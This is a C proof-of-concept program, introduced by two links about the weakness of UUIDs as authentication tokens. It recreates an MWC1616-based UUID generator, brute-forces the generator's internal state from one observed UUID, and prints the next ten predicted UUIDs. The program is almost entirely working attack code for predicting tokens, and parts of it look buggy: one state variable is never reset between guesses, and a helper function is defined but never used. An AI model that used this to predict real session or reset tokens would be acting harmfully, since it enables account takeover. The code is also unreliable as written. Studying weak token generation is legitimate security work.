

https://littlemaninmyhead.wordpress.com/2015/11/22/cautionary-note-uuids-should-generally-not-be-used-for-authentication-tokens/
https://versprite.com/blog/universally-unique-identifiers/


```
#include <stdio.h>
#include <math.h>
#include <string.h>


double MAX_RAND = 4294967296.0;

static unsigned int lo = 1, hi = 1; // initialise with dummy values

double mwc1616() {
    double x;

    lo = (18030 * (lo & 0xFFFF)) + (lo >> 16);
    hi = (36969 * (hi & 0xFFFF)) + (hi >> 16);

    x = (double) ((hi << 16) + (lo & 0xFFFF));
    return x / MAX_RAND;
}


void
randomUUID(unsigned char uuid[36]) {
    static unsigned char *itoh = "0123456789ABCDEF";
    int i = 0;

    // Make array of random hex digits. The UUID only has 32 digits in it, but we
    // allocate an extra items to make room for the '-'s we'll be inserting.
    for (i = 0; i < 36; i++)
        uuid[i] = (int) (mwc1616()*0x10);

    // Conform to RFC-4122, section 4.4
    uuid[14] = 4;  // Set 4 high bits of time_high field to version
    uuid[19] = (uuid[19] & 0x3) | 0x8;  // Specify 2 high bits of clock sequence

    // Convert to hex chars
    for (i = 0; i < 36; i++)
        uuid[i] = itoh[uuid[i]];

    // Insert '-'s
    uuid[8] = uuid[13] = uuid[18] = uuid[23] = '-';

    return ;
}


// Given a candidate for lo, approximate the value of  x  from mwc1616( )
double
approx_x( unsigned int cand_lo )
{
    double approx;
    approx = (((18030 * (cand_lo & 0xFFFF)) + (cand_lo >> 16)) << 16);
    if (approx < 0)
        approx = approx + MAX_RAND;
    approx = approx/MAX_RAND;
    return approx;
}



// Given three outputs from random number generator, predict future ones
int
main( int argc, char** argv ) {
    unsigned char uuid[37], *target_uuid;
    int i;
    unsigned int candidate_hi;

    if (argc < 2)
     {
            printf("usage: %s uuid\n\n", argv[0]);
            return -1;
    }

    target_uuid = argv[1];
    // few quick sanity checks on input
    if (strlen(target_uuid) != 36 || target_uuid[8] != '-' || target_uuid[13] != '-'
      || target_uuid[18] != '-' || target_uuid[23] != '-' ) {
        printf("Do you know what a UUID is?\n");
        return -1;
    }

    printf("Computing...\n");
    candidate_hi = 0;
    uuid[36] = '\0';
    do {
        hi = candidate_hi;
        randomUUID( uuid );
        if (!strncmp( uuid, target_uuid, 36 ))
            break;
        ++candidate_hi;
    } while (candidate_hi != 0);

    if (candidate_hi != 0) {
        int i;
        printf("\nThe value of hi is %u,", hi );
        printf(" and the next 10 UUIDs are:\n");
        for (i=0; i < 10; ++i) {
            randomUUID( uuid );
            printf("\t%s\n", uuid );
        }
    }
    else
        printf("No solution found.\n");

    return 0;
}


```
